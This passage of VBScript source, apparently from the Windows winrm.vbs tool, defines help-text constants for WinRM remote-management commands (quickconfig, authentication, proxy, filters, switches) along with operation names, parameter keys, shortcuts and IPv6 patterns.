private const L_HelpCertMappingExamples_003_0_Message = "Example: Create a CertMapping entry:"
private const X_HelpCertMappingExamples_004_0_Message = "  winrm create winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subject=*.example.com+URI=wmicimv2/* @{UserName=""USERNAME"";Password=""PASSWORD""} -remote:localhost"
private const L_HelpCertMappingExamples_005_0_Message = ""

'''''''''''''''''''''
' HELP - CONFIGSDDL
private const L_HelpConfigsddl_000_1_Message = "  winrm configsddl RESOURCE_URI"
private const L_HelpConfigsddl_001_0_Message = ""
private const L_HelpConfigsddl_002_0_Message = "Changes an existing entry in the plugin configuration to "
private const L_HelpConfigsddl_002_1_Message = "control remote access to WinRM resources."
private const L_HelpConfigsddl_003_0_Message = "This command will fail if the plugin does not exist."
private const L_HelpConfigsddl_004_0_Message = ""
private const L_HelpConfigsddl_005_0_Message = "This command will launch a GUI to edit the security settings."
private const L_HelpConfigsddl_005_1_Message = ""
private const L_HelpConfigsddl_006_0_Message = "RESOURCE_URI is always treated as a prefix."
private const L_HelpConfigsddl_010_0_Message = ""
private const L_HelpConfigsddl_011_0_Message = "To change the default security (the RootSDDL setting) use:"
private const X_HelpConfigsddl_012_0_Message = "  winrm configsddl default"

'''''''''''''''''''''
' HELP - QUICKCONFIG
private const X_HelpQuickConfig_001_0_Message = "winrm quickconfig [-quiet] [-transport:VALUE] [-force]"
private const X_HelpQuickConfig_002_0_Message = ""
private const L_HelpQuickConfig_003_0_Message = "Performs configuration actions to enable this machine for remote management."
private const L_HelpQuickConfig_004_0_Message = "Includes:"
private const L_HelpQuickConfig_005_0_Message = "  1. Start the WinRM service"
private const L_HelpQuickConfig_006_0_Message = "  2. Set the WinRM service type to auto start"
private const L_HelpQuickConfig_007_0_Message = "  3. Create a listener to accept request on any IP address"
private const L_HelpQuickConfig_008_0_Message = "  4. Enable firewall exception for WS-Management traffic (for http only)"
private const X_HelpQuickConfig_009_0_Message = ""
private const X_HelpQuickConfig_010_0_Message = "-q[uiet]"
private const X_HelpQuickConfig_010_1_Message = "--------"
private const L_HelpQuickConfig_011_0_Message = "If present, quickconfig will not prompt for confirmation."
private const X_HelpQuickConfig_012_0_Message = "-transport:VALUE"
private const X_HelpQuickConfig_013_0_Message = "----------------"
private const L_HelpQuickConfig_014_0_Message = "Perform quickconfig for specific transport."
private const L_HelpQuickConfig_015_0_Message = "Possible options are http and https.  Defaults to http."
private const X_HelpQuickConfig_016_0_Message = "-force"
private const X_HelpQuickConfig_017_0_Message = "--------"
private const L_HelpQuickConfig_018_0_Message = "If present, quickconfig will not prompt for confirmation, and will enable "
private const L_HelpQuickConfig_019_0_Message = "the firewall exception regardless of current network profile settings."

'''''''''''''''''''''
' HELP - REMOTE
private const L_HelpRemote_001_0_Message = "winrm OPERATION -remote:VALUE [-unencrypted] [-usessl]"
private const L_HelpRemote_002_0_Message = ""
private const L_HelpRemote_003_0_Message = "-r[emote]:VALUE"
private const L_HelpRemote_004_0_Message = "---------------"
private const L_HelpRemote_005_0_Message = "Specifies identifier of remote endpoint/system.  "
private const L_HelpRemote_006_0_Message = "May be a simple host name or a complete URL."
private const L_HelpRemote_007_0_Message = ""
private const L_HelpRemote_008_0_Message = "  [TRANSPORT://]HOST[:PORT][/PREFIX]"
private const L_HelpRemote_009_0_Message = ""
private const L_HelpRemote_010_0_Message = "Transport: One of HTTP or HTTPS; default is HTTP."
private const L_HelpRemote_011_0_Message = "Host: Can be in the form of a DNS name, NetBIOS name, or IP address."
private const L_HelpRemote_012_0_Message = "Port: If port is not specified then the following default rules apply:"
private const L_HelpRemote_013_0_Message = "Prefix: Defaults to wsman."
private const L_HelpRemote_014_0_Message = ""
private const L_HelpRemote_015_0_Message = "Note: IPv6 addresses must be enclosed in brackets."
private const L_HelpRemote_016_0_Message = "Note: When using HTTPS, the machine name must match the server's certificate"
private const L_HelpRemote_017_0_Message = "      common name (CN) unless -skipCNcheck is used."
private const L_HelpRemote_018_0_Message = "Note: Defaults for port and prefix can be changed in the local configuration."

private const L_HelpRemoteExample_001_0_Message = "Example: Connect to srv.corp.com via http:"
private const X_HelpRemoteExample_002_0_Message = "  winrm get uri -r:srv.corp.com"
private const L_HelpRemoteExample_003_0_Message = ""
private const L_HelpRemoteExample_004_0_Message = "Example: Connect to local computer machine1 via https:"
private const X_HelpRemoteExample_005_0_Message = "  winrm get uri -r:https://machine1"
private const L_HelpRemoteExample_006_0_Message = ""
private const L_HelpRemoteExample_007_0_Message = "Example: Connect to an IPv6 machine via http:"
private const X_HelpRemoteExample_008_0_Message = "  winrm get uri -r:[1:2:3::8]"
private const L_HelpRemoteExample_009_0_Message = ""
private const L_HelpRemoteExample_010_0_Message = "Example: Connect to an IPv6 machine via https on a non-default port and URL:"
private const X_HelpRemoteExample_011_0_Message = "  winrm get uri -r:https://[1:2:3::8]:444/path"

private const L_HelpRemoteUnencrypted_001_0_Message = "-un[encrypted]"
private const L_HelpRemoteUnencrypted_002_0_Message = "--------------"
private const L_HelpRemoteUnencrypted_003_0_Message = "Specifies that no encryption will be used when doing remote operations over"
private const L_HelpRemoteUnencrypted_004_0_Message = "HTTP.  Unencrypted traffic is not allowed by default and must be enabled in"
private const L_HelpRemoteUnencrypted_005_0_Message = "the local configuration."

private const L_HelpRemoteConfig_001_0_Message = "To enable this machine to be remotely managed see:"

'''''''''''''''''''''
' HELP - AUTH
private const L_HelpAuth_001_0_Message = "winrm OPERATION -remote:VALUE "
private const L_HelpAuth_002_0_Message = "  [-authentication:VALUE] "
private const L_HelpAuth_003_0_Message = "  [-username:USERNAME] "
private const L_HelpAuth_004_0_Message = "  [-password:PASSWORD]"
private const L_HelpAuth_004_1_Message = "  [-certificate:THUMBPRINT]"
private const L_HelpAuth_005_0_Message = ""
private const L_HelpAuth_006_0_Message = "When connecting remotely, you can specify which credentials and which"
private const L_HelpAuth_007_0_Message = "authentication mechanisms to use.  If none are specified the current "
private const L_HelpAuth_008_0_Message = "logged-on user's credentials will be used."

private const L_HelpAuthAuth_001_0_Message = "-a[uthentication]:VALUE"
private const L_HelpAuthAuth_002_0_Message = "-----------------------"
private const L_HelpAuthAuth_003_0_Message = "Specifies authentication mechanism used when communicating with remote machine."
private const L_HelpAuthAuth_004_0_Message = "Possible options are None, Basic, Digest, Negotiate, Kerberos, CredSSP."
private const L_HelpAuthAuth_004_1_Message = "Possible options are None, Basic, Digest, Negotiate, Kerberos."
private const L_HelpAuthAuth_005_0_Message = "Examples:"
private const X_HelpAuthAuth_006_0_Message = "  -a:None"
private const X_HelpAuthAuth_007_0_Message = "  -a:Basic"
private const X_HelpAuthAuth_008_0_Message = "  -a:Digest"
private const X_HelpAuthAuth_009_0_Message = "  -a:Negotiate"
private const X_HelpAuthAuth_010_0_Message = "  -a:Kerberos"
private const X_HelpAuthAuth_010_1_Message = "  -a:Certificate"
private const X_HelpAuthAuth_010_2_Message = "  -a:CredSSP"
private const L_HelpAuthAuth_011_0_Message = "Note: If an authentication mechanism is not specified, Kerberos is used unless"
private const L_HelpAuthAuth_012_0_Message = "      one of the conditions below is true, in which case Negotiate is used:"
private const L_HelpAuthAuth_013_0_Message = "   -explicit credentials are supplied and the destination host is trusted"
private const L_HelpAuthAuth_013_1_Message = "   -the destination host is ""localhost"", ""127.0.0.1"" or ""[::1]"""
private const L_HelpAuthAuth_013_2_Message = "   -the client computer is in workgroup and the destination host is trusted"
private const L_HelpAuthAuth_014_0_Message = "Note: Not all authentication mechanisms are enabled by default.  Allowed"
private const L_HelpAuthAuth_015_0_Message = "      authentication mechanisms can be controlled by local configuration "
private const L_HelpAuthAuth_016_0_Message = "      or group policy."
private const L_HelpAuthAuth_017_0_Message = "Note: Most operations will require an authentication mode other than None."
private const L_HelpAuthAuth_018_0_Message = "Note: Certificate authentication can be used only with the HTTPS transport."
private const L_HelpAuthAuth_019_0_Message = "      To configure an HTTPS listener for the WinRM service run the command:"
private const L_HelpAuthAuth_020_0_Message = "      ""winrm quickconfig -transport:HTTPS"""

private const L_HelpAuthUsername_001_0_Message = "-u[sername]:USERNAME"
private const L_HelpAuthUsername_002_0_Message = "--------------------"
private const L_HelpAuthUsername_003_0_Message = "Specifies username on remote machine. Cannot be used on local machine."
private const L_HelpAuthUsername_004_0_Message = "User must be member of local Administrators group on remote machine."
private const L_HelpAuthUsername_005_0_Message = "If the user account is a local account on the remote machine,"
private const L_HelpAuthUsername_006_0_Message = "the syntax should be in the form -username:USERNAME"
private const L_HelpAuthUsername_007_0_Message = "If the username is a domain account, the syntax should be in the form"
private const L_HelpAuthUsername_008_0_Message = "-username:DOMAIN\USERNAME"
private const L_HelpAuthUsername_009_0_Message = "If Basic or Digest is used, then -username is required."
private const L_HelpAuthUsername_010_0_Message = "If Kerberos is used, then the current logged-on user's credentials"
private const L_HelpAuthUsername_011_0_Message = "are used if -username is not supplied. Only domain credentials can"
private const L_HelpAuthUsername_011_1_Message = "be used with Kerberos."
private const L_HelpAuthUsername_012_0_Message = "If Negotiate is used, then -username is required unless"
private const L_HelpAuthUsername_013_0_Message = "one of the conditions below is true:"
private const L_HelpAuthUsername_014_0_Message = "   -the destination host is ""localhost"", ""127.0.0.1"" or ""[::1]"""
private const L_HelpAuthUsername_015_0_Message = "   -the client computer is in workgroup and the destination host is trusted"
private const L_HelpAuthUsername_016_0_Message = "If CredSSP is used, then username and password are required."

private const L_HelpAuthPassword_001_0_Message = "-p[assword]:PASSWORD"
private const L_HelpAuthPassword_002_0_Message = "--------------------"
private const L_HelpAuthPassword_003_0_Message = "Specifies password on command line to override interactive prompt."
private const L_HelpAuthPassword_004_0_Message = "Applies only if -username:USERNAME option is used."

private const L_HelpAuthCertificate_001_0_Message = "-c[ertificate]:THUMBPRINT"
private const L_HelpAuthCertificate_002_0_Message = "--------------------"
private const L_HelpAuthCertificate_003_0_Message = "Specifies the thumbprint of a certificate that must exist in the local"
private const L_HelpAuthCertificate_004_0_Message = "machine store or in the current user store. The certificate must be intended"
private const L_HelpAuthCertificate_005_0_Message = "for client authentication."
private const L_HelpAuthCertificate_006_0_Message = "Applies only if -a:Certificate is used."
private const L_HelpAuthCertificate_007_0_Message = "THUMBPRINT can contain spaces, in which case it must be enclosed in"
private const L_HelpAuthCertificate_008_0_Message = "double quotation marks."
private const L_HelpAuthCertificate_009_0_Message = "Examples:"
private const L_HelpAuthCertificate_010_0_Message = "-c:7b0cf48026409e38a2d6348761b1dd1271c4f86d"
private const L_HelpAuthCertificate_011_0_Message = "-c:""7b 0c f4 80 26 40 9e 38 a2 d6 34 87 61 b1 dd 12 71 c4 f8 6d"""

'''''''''''''''''''''
' HELP - PROXY
private const X_HelpProxy_001_0_Message = "winrm OPERATION -remote:VALUE "
private const X_HelpProxy_002_0_Message = "  [-proxyaccess:VALUE] "
private const X_HelpProxy_002_1_Message = "  [-proxyauth:VALUE] "
private const X_HelpProxy_003_0_Message = "  [-proxyusername:USERNAME] "
private const X_HelpProxy_004_0_Message = "  [-proxypassword:PASSWORD]"
private const L_HelpProxy_005_0_Message = ""
private const L_HelpProxy_006_0_Message = "When connecting remotely, you can specify which proxy access type,"
private const L_HelpProxy_007_0_Message = " proxy credentials and proxy authentication mechanisms to use."

private const X_HelpProxyAccess_001_0_Message = "-p[roxy]ac[cess]:VALUE"
private const L_HelpProxyAccess_002_0_Message = "-----------------------"
private const L_HelpProxyAccess_003_0_Message = "Specifies which proxy settings to retrieve when connecting to a remote machine."
private const L_HelpProxyAccess_004_0_Message = "Possible options are ie_settings, winhttp_settings, auto_detect, no_proxy."
private const L_HelpProxyAccess_005_0_Message = "Examples:"
private const X_HelpProxyAccess_006_0_Message = "  -pac:ie_settings"
private const X_HelpProxyAccess_007_0_Message = "  -pac:winhttp_settings"
private const X_HelpProxyAccess_008_0_Message = "  -pac:auto_detect"
private const X_HelpProxyAccess_009_0_Message = "  -pac:no_proxy"
private const L_HelpProxyAccess_010_0_Message = ""
private const L_HelpProxyAccess_011_0_Message = "The WSMan client provides four options for the configuration of proxy settings:"
private const L_HelpProxyAccess_012_0_Message = "   -use settings configured through Internet Explorer (default)"
private const L_HelpProxyAccess_013_0_Message = "   -use settings configured through WinHTTP"
private const L_HelpProxyAccess_014_0_Message = "   -automatic proxy discovery"
private const L_HelpProxyAccess_015_0_Message = "   -direct connection (don’t use a proxy)"

private const L_HelpProxyAuth_001_0_Message = "-p[roxy]a[uth]:VALUE"
private const L_HelpProxyAuth_002_0_Message = "-----------------------"
private const L_HelpProxyAuth_003_0_Message = "Specifies authentication mechanism used to authenticate with a proxy."
private const L_HelpProxyAuth_004_0_Message = "Possible options are Basic, Digest, Negotiate."
private const L_HelpProxyAuth_005_0_Message = "Examples:"
private const X_HelpProxyAuth_007_0_Message = "  -pa:Basic"
private const X_HelpProxyAuth_008_0_Message = "  -pa:Digest"
private const X_HelpProxyAuth_009_0_Message = "  -pa:Negotiate"
private const L_HelpProxyAuth_010_0_Message = "If -proxyauth:VALUE is used then -proxyaccess:VALUE is required."

private const L_HelpProxyUsername_001_0_Message = "-p[roxy]u[sername]:USERNAME"
private const L_HelpProxyUsername_002_0_Message = "--------------------"
private const L_HelpProxyUsername_003_0_Message = "Specifies username to authenticate with proxy. Cannot be used on local machine."
private const L_HelpProxyUsername_005_0_Message = "If the user account is a local account on the remote machine,"
private const L_HelpProxyUsername_006_0_Message = "the syntax should be in the form -proxyusername:USERNAME"
private const L_HelpProxyUsername_007_0_Message = "If the username is a domain account, the syntax should be in the form"
private const L_HelpProxyUsername_008_0_Message = "-proxyusername:DOMAIN\USERNAME"
private const L_HelpProxyUsername_009_0_Message = "If -proxyusername is used then -proxyauth:VALUE is required."

private const L_HelpProxyPassword_001_0_Message = "-p[roxy]p[assword]:PASSWORD"
private const L_HelpProxyPassword_002_0_Message = "--------------------"
private const L_HelpProxyPassword_003_0_Message = "Specifies password on command line to override interactive prompt."
private const L_HelpProxyPassword_004_0_Message = "Applies only if -proxyusername:USERNAME option is used."

'''''''''''''''''''''
' HELP - INPUT
private const L_HelpInput_001_0_Message = "Input can be by either providing key/value pairs directly on the command line"
private const L_HelpInput_002_0_Message = "or reading XML from a file."
private const L_HelpInput_003_0_Message = ""
private const L_HelpInput_004_0_Message = "  winrm OPERATION -file:VALUE "
private const L_HelpInput_005_0_Message = "  winrm OPERATION @{KEY=""VALUE""[;KEY=""VALUE""]}"
private const L_HelpInput_006_0_Message = ""
private const L_HelpInput_007_0_Message = "Applies to set, create, and invoke operations."
private const L_HelpInput_008_0_Message = "Use either @{KEY=VALUE} or input from an XML file, but not both."
private const L_HelpInput_009_0_Message = ""
private const L_HelpInput_010_0_Message = "-file:VALUE"
private const L_HelpInput_011_0_Message = "-----------"
private const L_HelpInput_012_0_Message = "Specifies name of file used as input."
private const L_HelpInput_013_0_Message = "VALUE can be absolute path, relative path, or filename without path."
private const L_HelpInput_014_0_Message = "Names or paths that include spaces must be enclosed in quotation marks."
private const L_HelpInput_015_0_Message = ""
private const L_HelpInput_016_0_Message = "@{KEY=""VALUE""[;KEY=""VALUE""]}"
private const L_HelpInput_017_0_Message = "----------------------------"
private const L_HelpInput_018_0_Message = "Keys are not unique."
private const L_HelpInput_019_0_Message = "Values must be within quotation marks."
private const L_HelpInput_020_0_Message = "$null is a special value."
private const L_HelpInput_021_0_Message = ""
private const L_HelpInput_022_0_Message = "Examples:"
private const X_HelpInput_023_0_Message = "  @{key1=""value1"";key2=""value2""}"
private const X_HelpInput_024_0_Message = "  @{key1=$null;key2=""value2""}"


'''''''''''''''''''''
' HELP - FILTERS
private const L_HelpFilter_001_0_Message = "Filters allow selecting a subset of the desired resources:"
private const X_HelpFilter_002_0_Message = ""
private const X_HelpFilter_003_0_Message = "winrm enumerate RESOURCE_URI -filter:EXPR [-dialect:URI] [-Associations]..."
private const X_HelpFilter_004_0_Message = ""
private const L_HelpFilter_005_0_Message = "-filter:EXPR"
private const X_HelpFilter_006_0_Message = "------------"
private const L_HelpFilter_007_0_Message = "Filter expression for enumeration."
private const X_HelpFilter_008_0_Message = ""
private const L_HelpFilter_009_0_Message = "-dialect:URI"
private const X_HelpFilter_010_0_Message = "------------"
private const L_HelpFilter_011_0_Message = "Dialect of the filter expression for enumeration."
private const L_HelpFilter_012_0_Message = "This may be any dialect supported by the remote service.  "
private const X_HelpFilter_013_0_Message = ""
private const L_HelpFilter_014_0_Message = "The following aliases can be used for the dialect URI:"
private const X_HelpFilter_015_0_Message = "* WQL - http://schemas.microsoft.com/wbem/wsman/1/WQL"
private const X_HelpFilter_016_0_Message = "* Selector - http://schemas.dmtf.org/wbem/wsman/1/wsman/SelectorFilter"
private const X_HelpFilter_016_1_Message = "* Association - http://schemas.dmtf.org/wbem/wsman/1/cimbinding/AssociationFilter"
private const X_HelpFilter_017_0_Message = ""
private const L_HelpFilter_018_0_Message = "The dialect URI defaults to WQL when used with enumeration."
private const X_HelpFilter_019_0_Message = ""
private const L_HelpFilter_019_1_Message = "-Associations"
private const L_HelpFilter_019_2_Message = "------------"
private const X_HelpFilter_019_3_Message = "This parameter has relevance only when the Dialect parameter exists, and its value is specified as Association. Otherwise this parameter should not be used."
private const X_HelpFilter_019_4_Message = "This indicates retrieval of Association Instances rather than Associated Instances. Absence of this parameter would imply Associated Instances are to be retrieved."
private const X_HelpFilter_019_5_Message = ""
private const L_HelpFilter_020_0_Message = "Example: Find running services"
private const X_HelpFilter_021_0_Message = "  winrm e wmicimv2/Win32_Service -dialect:selector -filter:{State=""Running""}"
private const X_HelpFilter_022_0_Message = ""
private const L_HelpFilter_023_0_Message = "Example: Find auto start services that are not running"
private const X_HelpFilter_024_0_Message = "  winrm e wmicimv2/* -filter:""select * from Win32_Service where State!='Running' and StartMode='Auto'"""
private const L_HelpFilter_025_0_Message = ""
private const L_HelpFilter_026_0_Message = "Example: Find the services on which winrm service has a dependency"
private const X_HelpFilter_027_0_Message = "  winrm e wmicimv2/* -dialect:Association -filter:{Object=Win32_Service?Name=WinRM;AssociationClassName=Win32_DependentService;ResultClassName=win32_service;ResultRole=antecedent;Role=dependent}"

'''''''''''''''''''''
' HELP - SWITCHES
private const L_HelpSwitchTimeout_001_0_Message = "-timeout:MS"
private const L_HelpSwitchTimeout_002_0_Message = "-----------"
private const L_HelpSwitchTimeout_003_0_Message = "Timeout in milliseconds. Limits duration of corresponding operation."
private const L_HelpSwitchTimeout_004_0_Message = "Default timeout can be configured by:"
private const X_HelpSwitchTimeout_005_0_Message = "  winrm set winrm/config @{MaxTimeoutms=""XXXXXX""}"
private const L_HelpSwitchTimeout_006_0_Message = "Where XXXXXX is an integer indicating milliseconds."

private const X_HelpSwitchSkipCACheck_001_0_Message = "-skipCAcheck"
private const L_HelpSwitchSkipCACheck_002_0_Message = "------------"
private const L_HelpSwitchSkipCACheck_003_0_Message = "Specifies that certificate issuer need not be a trusted root authority."
private const L_HelpSwitchSkipCACheck_004_0_Message = "Used only in remote operations using HTTPS (see -remote option)."
private const L_HelpSwitchSkipCACheck_005_0_Message = "This option should be used only for trusted machines."

private const X_HelpSwitchSkipCNCheck_001_0_Message = "-skipCNcheck"
private const L_HelpSwitchSkipCNCheck_002_0_Message = "------------"
private const L_HelpSwitchSkipCNCheck_003_0_Message = "Specifies that certificate common name (CN) of the server need not match the"
private const L_HelpSwitchSkipCNCheck_004_0_Message = "hostname of the server. "
private const L_HelpSwitchSkipCNCheck_005_0_Message = "Used only in remote operations using HTTPS (see -remote option)."
private const L_HelpSwitchSkipCNCheck_006_0_Message = "This option should be used only for trusted machines."

private const X_HelpSwitchSkipRevCheck_001_0_Message = "-skipRevocationcheck"
private const X_HelpSwitchSkipRevCheck_002_0_Message = "-------------------"
private const L_HelpSwitchSkipRevCheck_003_0_Message = "Specifies that the revocation status of the server certificate is not checked."
private const L_HelpSwitchSkipRevCheck_004_0_Message = "Used only in remote operations using HTTPS (see -remote option)."
private const L_HelpSwitchSkipRevCheck_005_0_Message = "This option should be used only for trusted machines."

private const X_HelpSwitchDefaultCreds_001_0_Message = "-defaultCreds"
private const X_HelpSwitchDefaultCreds_002_0_Message = "-------------------"
private const L_HelpSwitchDefaultCreds_003_0_Message = "Specifies that the implicit credentials are allowed when Negotiate is used."
private const L_HelpSwitchDefaultCreds_004_0_Message = "Allowed only in remote operations using HTTPS (see -remote option)."

private const L_HelpSwitchDialect_001_0_Message = "-dialect:VALUE"
private const L_HelpSwitchDialect_002_0_Message = "--------------"
private const L_HelpSwitchDialect_003_0_Message = "Dialect of the filter expression for enumeration or fragment."
private const L_HelpSwitchDialect_004_0_Message = "Example: Use a WQL query"
private const X_HelpSwitchDialect_005_0_Message = "  -dialect:http://schemas.microsoft.com/wbem/wsman/1/WQL"
private const L_HelpSwitchDialect_006_0_Message = "Example: Use XPATH for filtering with enumeration or fragment get/set."
private const X_HelpSwitchDialect_007_0_Message = "  -dialect:http://www.w3.org/TR/1999/REC-xpath-19991116"

'private const L_HelpSwitchFilter_001_0_Message = "-filter:VALUE"
'private const L_HelpSwitchFilter_002_0_Message = "-----------------"
'private const L_HelpSwitchFilter_003_0_Message = "Filter expression for enumeration."
'private const L_HelpSwitchFilter_004_0_Message = "Example: Use a WQL query"
'private const X_HelpSwitchFilter_005_0_Message = "  -filter:""select * from Win32_process where handle=0"""

private const L_HelpSwitchFragment_001_0_Message = "-fragment:VALUE"
private const L_HelpSwitchFragment_002_0_Message = "---------------"
private const L_HelpSwitchFragment_003_0_Message = "Specify a section inside the instance XML that is to be updated or retrieved"
private const L_HelpSwitchFragment_004_0_Message = "for the given operation."
private const L_HelpSwitchFragment_005_0_Message = "Example: Get the status of the spooler service"
private const X_HelpSwitchFragment_006_0_Message = "  winrm get wmicimv2/Win32_Service?name=spooler -fragment:Status/text()"

private const L_HelpSwitchOption_001_0_Message = "-options:{KEY=""VALUE""[;KEY=""VALUE""]}"
private const L_HelpSwitchOption_002_0_Message = "------------------------------------"
private const L_HelpSwitchOption_003_0_Message = "Key/value pairs for provider-specific options."
private const L_HelpSwitchOption_004_0_Message = "To specify NULL as a value, use $null"
private const L_HelpSwitchOption_005_0_Message = ""
private const L_HelpSwitchOption_006_0_Message = "Examples:"
private const X_HelpSwitchOption_007_0_Message = "  -options:{key1=""value1"";key2=""value2""}"
private const X_HelpSwitchOption_008_0_Message = "  -options:{key1=$null;key2=""value2""}"

private const X_HelpSwitchSPNPort_001_0_Message = "-SPNPort"
private const L_HelpSwitchSPNPort_002_0_Message = "--------"
private const L_HelpSwitchSPNPort_003_0_Message = "Appends port number to the Service Principal Name (SPN) of the remote server."
private const L_HelpSwitchSPNPort_004_0_Message = "Service principal name is used when Negotiate or Kerberos authentication"
private const L_HelpSwitchSPNPort_005_0_Message = "mechanism is in use."

private const L_HelpSwitchEncoding_001_0_Message = "-encoding:VALUE"
private const L_HelpSwitchEncoding_002_0_Message = "---------------"
private const L_HelpSwitchEncoding_003_0_Message = "Specifies encoding type when talking to remote machine (see -remote"
private const L_HelpSwitchEncoding_004_0_Message = "option). Possible options are ""utf-8"" and ""utf-16""."
private const L_HelpSwitchEncoding_005_0_Message = "Default is utf-8."
private const L_HelpSwitchEncoding_006_0_Message = "Examples:"
private const X_HelpSwitchEncoding_007_0_Message = "  -encoding:utf-8"
private const X_HelpSwitchEncoding_008_0_Message = "  -encoding:utf-16"

private const L_HelpSwitchFormat_001_0_Message = "-f[ormat]:FORMAT"
private const L_HelpSwitchFormat_002_0_Message = "----------------"
private const L_HelpSwitchFormat_003_0_Message = "Specifies format of output."
private const L_HelpSwitchFormat_004_0_Message = "FORMAT can be ""xml"", ""pretty"" (better formatted XML), or ""text""."
private const L_HelpSwitchFormat_005_0_Message = "Examples:"
private const X_HelpSwitchFormat_006_0_Message = "  -format:xml"
private const X_HelpSwitchFormat_007_0_Message = "  -format:pretty"
private const X_HelpSwitchFormat_008_0_Message = "  -format:text"


private const L_HelpRemoteUseSsl_001_0_Message = "-[use]ssl"
private const L_HelpRemoteUseSsl_002_0_Message = "---------"
private const L_HelpRemoteUseSsl_003_0_Message = "Specifies that an SSL connection will be used when doing remote operations."
private const L_HelpRemoteUseSsl_004_0_Message = "The transport in the remote option should not be specified. "

private const L_HelpRemote_012_1_Message = "        * If transport is specified to HTTP then port 80 is used."
private const L_HelpRemote_012_2_Message = "        * If transport is specified to HTTPS then port 443 is used."
private const L_HelpRemote_012_3_Message = "        * If transport is not specified and -usessl is not specified then port"
private const L_HelpRemote_012_4_Message = "          5985 is used for an HTTP connection."
private const L_HelpRemote_012_5_Message = "        * If transport is not specified and -usessl is specified then port 5986"
private const L_HelpRemote_012_6_Message = "          is used for an HTTPS connection."

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Operations
private const OP_GET  = "get"
private const OP_PUT  = "set"
private const OP_CONFIGSDDL  = "configsddl"
private const OP_CREATESDDL  = "createsddl"
private const OP_CRE  = "create"
private const OP_DEL  = "delete"
private const OP_ENU  = "enumerate"
private const OP_INV  = "invoke"
private const OP_HELP = "help"
private const OP_IDENTIFY    = "identify"
private const OP_QUICKCONFIG = "quickconfig"
private const OP_HELPMSG = "helpmsg"

' Named parameters (key names of key/value pairs)
private const NPARA_USERNAME  = "username"
private const NPARA_PASSWORD  = "password"
private const NPARA_PROXYUSERNAME  = "proxyusername"
private const NPARA_PROXYPASSWORD  = "proxypassword"
private const NPARA_CERT      = "certificate"
private const NPARA_DIALECT   = "dialect"
private const NPARA_ASSOCINST = "associations"
private const NPARA_FILE      = "file"
private const NPARA_FILTER    = "filter"
private const NPARA_HELP      = "?"
private const NPARA_REMOTE    = "remote"
private const NPARA_NOCACHK   = "skipcacheck"
private const NPARA_NOCNCHK   = "skipcncheck"
private const NPARA_NOREVCHK   = "skiprevocationcheck"
private const NPARA_DEFAULTCREDS = "defaultcreds"
private const NPARA_SPNPORT   = "spnport"
private const NPARA_TIMEOUT   = "timeout"
private const NPARA_AUTH      = "authentication"
private const NPARA_PROXYAUTH      = "proxyauthentication"
private const NPARA_PROXYACCESS      = "proxyaccess"
private const NPARA_UNENCRYPTED = "unencrypted"
private const NPARA_ENCODING  = "encoding"
private const NPARA_FORMAT    = "format"
private const NPARA_OPTIONS   = "options"
private const NPARA_FRAGMENT  = "fragment"
private const NPARA_QUIET     = "quiet"
private const NPARA_TRANSPORT = "transport"
private const NPARA_PSEUDO_COMMAND   = "command"
private const NPARA_PSEUDO_OPERATION = "operation"
private const NPARA_PSEUDO_ACTION    = "action"
private const NPARA_PSEUDO_RESOURCE  = "resource"
private const NPARA_PSEUDO_AT        = "@"
private const NPARA_RETURN_TYPE      = "returntype"
private const NPARA_SHALLOW          = "shallow"
private const NPARA_BASE_PROPS_ONLY  = "basepropertiesonly"
private const NPARA_USESSL           = "usessl"
private const NPARA_FORCE            = "force"

private const SHORTCUT_CRE         = "c"
private const SHORTCUT_DEL         = "d"
private const SHORTCUT_ENU         = "e"
private const SHORTCUT_ENU2        = "enum"
private const SHORTCUT_GET         = "g"
private const SHORTCUT_INV         = "i"
private const SHORTCUT_IDENTIFY    = "id"
private const SHORTCUT_PUT         = "s"
private const SHORTCUT_PUT2        = "put"
private const SHORTCUT_PUT3        = "p"
private const SHORTCUT_QUICKCONFIG = "qc"
private const SHORTCUT_HELPMSG    = "helpmsg"

private const SHORTCUT_AUTH        = "a"
private const SHORTCUT_AUTH2       = "auth"
private const SHORTCUT_PROXYAUTH        = "pa"
private const SHORTCUT_PROXYAUTH2       = "proxyauth"
private const SHORTCUT_PROXYACCESS        = "pac"
private const SHORTCUT_PROXYACCESS2       = "proxyaccess"
private const SHORTCUT_FORMAT      = "f"
private const SHORTCUT_PASSWORD    = "p"
private const SHORTCUT_PROXYPASSWORD    = "pp"
private const SHORTCUT_REMOTE      = "r"
private const SHORTCUT_REMOTE2     = "machine"
private const SHORTCUT_USERNAME    = "u"
private const SHORTCUT_PROXYUSERNAME    = "pu"
private const SHORTCUT_UNENCRYPTED = "un"
private const SHORTCUT_USESSL      = "ssl"
private const SHORTCUT_QUIET       = "q"
private const SHORTCUT_CERT        = "c"

' Help topics
private const HELP_CONFIG   = "config"
private const HELP_CERTMAPPING   = "certmapping"
private const HELP_CUSTOMREMOTESHELL     = "customremoteshell"
private const HELP_URIS     = "uris"
private const HELP_ALIAS    = "alias"
private const HELP_ALIASES  = "aliases"
private const HELP_SWITCHES = "switches"
private const HELP_REMOTING = "remoting"
private const HELP_INPUT    = "input"
private const HELP_AUTH     = "auth"
private const HELP_PROXY     = "proxy"
private const HELP_FILTERS  = "filters"

' Literal values in key/value pairs
private const VAL_NO_AUTH     = "none"
private const VAL_BASIC       = "basic"
private const VAL_DIGEST      = "digest"
private const VAL_KERBEROS    = "kerberos"
private const VAL_NEGOTIATE   = "negotiate"
private const VAL_CERT        = "certificate"
private const VAL_CREDSSP     = "credssp"

' proxy access types
private const VAL_PROXY_IE_CONFIG     = "ie_settings"
private const VAL_PROXY_WINHTTP_CONFIG       = "winhttp_settings"
private const VAL_PROXY_AUTODETECT      = "auto_detect"
private const VAL_PROXY_NO_PROXY_SERVER    = "no_proxy"

' Enumeration returnType values
private const VAL_RT_OBJECT  = "object"
private const VAL_RT_EPR     = "epr"
private const VAL_RT_OBJ_EPR = "objectandepr"

' Output formatting flags
private const VAL_FORMAT_XML         = "xml"
private const VAL_FORMAT_PRETTY      = "pretty"
private const VAL_FORMAT_PRETTY_XSLT = "WsmPty.xsl"
private const VAL_FORMAT_TEXT        = "text"
private const VAL_FORMAT_TEXT_XSLT   = "WsmTxt.xsl"

'''''''''''''''''''''
' Patterns
private const PTRN_IPV6_1 = "([A-Fa-f0-9]{1,4}:){6}:[A-Fa-f0-9]{1,4}"
private const PTRN_IPV6_2 = "([A-Fa-f0-9]{1,4}:){7}[A-Fa-f0-9]{1,4}"
